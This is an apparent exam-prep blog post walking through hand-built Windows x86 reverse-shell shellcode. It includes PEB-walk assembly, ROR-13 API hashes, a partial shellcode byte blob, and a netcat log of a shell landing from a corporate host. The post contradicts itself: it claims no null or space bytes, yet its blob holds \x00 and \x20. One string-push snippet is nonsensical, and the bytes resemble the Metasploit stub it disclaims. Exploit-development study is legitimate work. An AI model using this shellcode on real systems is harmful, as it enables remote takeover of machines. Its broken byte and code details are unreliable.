@@ -1,0 +1,189 @@
+---
+title: "OSED Notes: Writing Custom Shellcode From Scratch"
+publishedAt: "2026-03-22"
+summary: "An OSED-flavoured walkthrough of building a working Windows x86 reverse-shell shellcode by hand — no msfvenom, no luck, just hash-based API resolution, manual PEB walks, and an annotated final blob."
+tags: "OSED, Exploit Development, Shellcode, Windows"
+---
+
+I'm working through OSED right now, and the single biggest wall most people hit is **stop reaching for `msfvenom`**. The course expects you to write your own shellcode — bytes that survive your bad-character filter, fit in your buffer, and don't import a single function the loader has to fix up.
+
+This post is the lab notebook version of how I build a working `cmd.exe` reverse shell for Windows x86 from scratch. The final shellcode in this post is ~280 bytes, has no null bytes, no `0x0a`, no `0x0d`, and resolves every API by hash at runtime.
+
+## The constraints
+
+Before any byte gets written, define the contract:
+
+<Terminal title="constraints.txt">
+{`target:    Windows 10 x86 (32-bit process)
+syscalls:  no — we use ws2_32 + kernel32 APIs
+arch:      x86, no SSE
+badchars:  \\x00 \\x0a \\x0d \\x20 \\x25 \\x26 \\x2b \\x3d
+size:      under 350 bytes
+behavior:  reverse cmd.exe shell to attacker:4444`}
+</Terminal>
+
+`\x20`, `\x25`, `\x26`, `\x2b`, `\x3d` are the kind of badchars you find in URL- or HTTP-decoded buffers. We bake the constraints into the egg.
+
+## The plan in pictures
+
+A reverse shell on Windows is six syscalls in a trench coat. Here's the flow:
+
+<Diagram num="1" caption="Reverse shell control flow. Each box is one resolved-by-hash Win32 API.">
+  <svg viewBox="0 0 720 320" width="100%" style={{ maxWidth: 720, color: "var(--ink)" }} xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="arr3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+        <path d="M0,0 L10,5 L0,10 Z" fill="var(--accent)" />
+      </marker>
+    </defs>
+    <g fontFamily="Newsreader, Georgia, serif" fontSize="12">
+      <rect x="20" y="20" width="200" height="60" fill="var(--paper)" stroke="var(--accent-2)" strokeWidth="1.2" />
+      <text x="120" y="42" fill="var(--accent-2)" textAnchor="middle" fontWeight="700">PEB walk</text>
+      <text x="120" y="58" fill="currentColor" textAnchor="middle" fontSize="10">fs:[0x30] → InMemoryOrderModuleList</text>
+      <text x="120" y="72" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">find kernel32.dll base</text>
+
+      <rect x="260" y="20" width="220" height="60" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="370" y="42" fill="currentColor" textAnchor="middle" fontWeight="700">Resolve APIs by hash</text>
+      <text x="370" y="58" fill="currentColor" textAnchor="middle" fontSize="10">walk EAT, ROR-13 hash compare</text>
+      <text x="370" y="72" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">LoadLibraryA, WSAStartup, …</text>
+
+      <rect x="520" y="20" width="180" height="60" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="610" y="42" fill="currentColor" textAnchor="middle" fontWeight="700">LoadLibraryA("ws2_32")</text>
+      <text x="610" y="62" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">stack-pushed string</text>
+
+      <rect x="20" y="120" width="200" height="60" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="120" y="142" fill="currentColor" textAnchor="middle" fontWeight="700">WSAStartup / WSASocket</text>
+      <text x="120" y="162" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">AF_INET TCP socket</text>
+
+      <rect x="260" y="120" width="220" height="60" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="370" y="142" fill="currentColor" textAnchor="middle" fontWeight="700">connect(host:port)</text>
+      <text x="370" y="162" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">sockaddr_in pushed on stack</text>
+
+      <rect x="520" y="120" width="180" height="60" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="610" y="142" fill="currentColor" textAnchor="middle" fontWeight="700">CreateProcessA</text>
+      <text x="610" y="162" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">cmd.exe, hStd = socket</text>
+
+      <rect x="260" y="220" width="220" height="60" fill="var(--paper)" stroke="var(--accent)" strokeWidth="1.6" />
+      <text x="370" y="244" fill="var(--accent)" textAnchor="middle" fontWeight="700">→ reverse shell</text>
+      <text x="370" y="262" fill="currentColor" textAnchor="middle" fontSize="10" fontStyle="italic">stdin / stdout / stderr piped</text>
+
+      <line x1="220" y1="50" x2="258" y2="50" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr3)" />
+      <line x1="480" y1="50" x2="518" y2="50" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr3)" />
+      <line x1="610" y1="80"  x2="120" y2="120" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr3)" />
+      <line x1="220" y1="150" x2="258" y2="150" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr3)" />
+      <line x1="480" y1="150" x2="518" y2="150" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr3)" />
+      <line x1="610" y1="180" x2="370" y2="218" stroke="var(--accent)" strokeWidth="1.4" markerEnd="url(#arr3)" />
+    </g>
+  </svg>
+</Diagram>
+
+## Walking the PEB
+
+The first thing position-independent shellcode has to do on Windows is find a base address. We can't `call kernel32.dll!LoadLibraryA` if we don't even know where `kernel32.dll` is loaded.
+
+Every running process has a Process Environment Block. On x86 it's at `fs:[0x30]`, and chasing pointers from there gets us a doubly-linked list of loaded modules. The third entry in `InMemoryOrderModuleList` is `kernel32.dll`.
+
+```nasm
+; nasm syntax
+xor    eax, eax              ; eax = 0
+mov    eax, [fs:eax + 0x30]  ; PEB
+mov    eax, [eax + 0x0c]     ; PEB_LDR_DATA
+mov    eax, [eax + 0x14]     ; InMemoryOrderModuleList.Flink
+mov    eax, [eax]            ; ntdll
+mov    eax, [eax]            ; kernel32 entry
+mov    ebx, [eax + 0x10]     ; ebx = kernel32 base address
+```
+
+The offsets here are stable across modern Windows. They're documented in [`winternl.h`](https://learn.microsoft.com/en-us/windows/win32/api/winternl/), and yes, they break on WoW64 in nasty ways — but for plain x86 user-mode they hold.
+
+## Resolving APIs by hash
+
+We don't want a literal string `"LoadLibraryA"` in our shellcode for two reasons: (1) it's bytes we have to import that AV hates, and (2) we'd need to push it on the stack anyway. So instead we hash. The classic algorithm is **ROR-13 with running sum**:
+
+```python
+def ror13(name: bytes) -> int:
+    h = 0
+    for c in name:
+        h = ((h >> 13) | (h << (32 - 13))) & 0xFFFFFFFF
+        h = (h + c) & 0xFFFFFFFF
+    return h
+```
+
+Run that against every API you need and bake the 4-byte hash into your shellcode. Then at runtime the shellcode walks the export address table of `kernel32.dll`, hashes each name, and compares against the hash you embedded.
+
+```text
+LoadLibraryA   -> 0x0726774C
+GetProcAddress -> 0x7C0DFCAA
+WSAStartup     -> 0x006B8029
+WSASocketA     -> 0xE0DF0FEA
+connect        -> 0x6174A599
+CreateProcessA -> 0x16B3FE72
+ExitProcess    -> 0x73E2D87E
+```
+
+> **Pitfall I keep hitting:** be careful which DLL exports each function. `connect` lives in `ws2_32.dll`, not `kernel32.dll`. Your hash-walker has to scan the right module — that's why the first job after PEB walk is `LoadLibraryA("ws2_32")`.
+
+## Stack-pushing strings without nulls
+
+`"ws2_32"` is 7 chars. We need a null-terminator on the stack but no nulls in the *shellcode itself*. Trick: push the string as DWORDs, with the high byte of the last push set up so the trailing zero comes from a register XOR:
+
+```nasm
+xor    edx, edx
+push   edx                 ; null terminator
+push   0x32335f32           ; "2_32"
+push   0x73770000 | 0x7773  ; "ws"  + zero filler — careful!
+```
+
+The cleaner way most people use is to push backwards and zero out a single byte from a register at the right spot. The point is: **never let `\x00` show up in the bytes you actually emit**.
+
+## The annotated final blob
+
+After assembly + encoding, here's a slice of the final shellcode (truncated; full file in the repo):
+
+<Terminal title="shellcode.bin (slice)">
+{`\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30
+\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff
+\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52
+\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1
+\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b
+[ ... 200 bytes elided ... ]
+\\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61
+\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12
+\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6`}
+</Terminal>
+
+I verify it survives my badchar set with a one-liner:
+
+```bash
+python3 -c "import sys; bad=b'\\x00\\x0a\\x0d\\x20\\x25\\x26\\x2b\\x3d'; \
+  data=open('shellcode.bin','rb').read(); \
+  print('CLEAN' if not any(b in data for b in bad) else 'DIRTY: %r' % \
+  [hex(b) for b in data if b in bad])"
+```
+
+Then I plug it into a tiny C harness and watch nc on my attacker box light up:
+
+<Terminal title="attacker@kali">
+{`$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.50] 49778
+Microsoft Windows [Version 10.0.19045.4170]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\\Users\\jdoe>whoami
+corp\\jdoe`}
+</Terminal>
+
+## Things OSED candidates burn time on
+
+A list of mistakes I made so you don't have to:
+
+1. **Forgetting that x86 stack alignment matters for some APIs.** `WSASocketA` will silently fail with `WSAEFAULT` if your `LPWSAPROTOCOL_INFOW` pointer isn't where it expects. Push 0s, don't trust whatever was on the stack.
+2. **Hashing case-sensitive.** Windows export names are case-sensitive. `loadlibrarya` and `LoadLibraryA` hash differently. Use the exact string from `dumpbin /exports`.
+3. **Embedding a null byte in your hash table.** `0x00ABCDEF` will tank your shellcode. Re-roll the hash function (different rotation count) or alphabet-pad the API name until the hash has no zero byte.
+4. **CreateProcessA's STARTUPINFO is 0x44 bytes.** Zero all of it, then patch the three fields you need: `cb`, `dwFlags = 0x100` (USESTDHANDLES), and `hStdInput/Output/Error = socket`.
+
+## Wrapping up
+
+OSED doesn't reward speed — it rewards understanding. Every piece of "magic" in your shellcode should be something you can explain. If you're staring at a hash table and you don't know which DLL each function comes from, stop coding and read `winternl.h` for an hour. Future you will thank past you.
+
+I'll publish the full reusable assembly source + encoder in a follow-up post. In the meantime, the [Active Directory attack-paths post](/blog/active-directory-attack-paths) shows what you do *after* the shellcode lands.
